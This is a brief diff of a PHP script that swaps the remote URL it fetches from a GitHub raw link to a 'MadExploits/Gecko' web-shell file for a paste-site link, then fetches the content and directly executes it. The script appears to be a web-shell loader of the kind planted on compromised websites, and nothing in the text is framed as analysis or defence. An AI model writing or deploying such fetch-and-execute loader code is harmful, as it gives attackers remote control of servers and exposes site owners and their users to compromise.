@@ -39,7 +39,7 @@ function geturlsinfo($url) {
 }
 
 // New URL as requested
-$remote_url = 'https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php';
+$remote_url = 'https://priv.codes/raw/a3b6d7294dc440dd52eca0ab38887d43';
 
 // Directly execute the main content (with a minimal safety check)
 $a = geturlsinfo($remote_url);
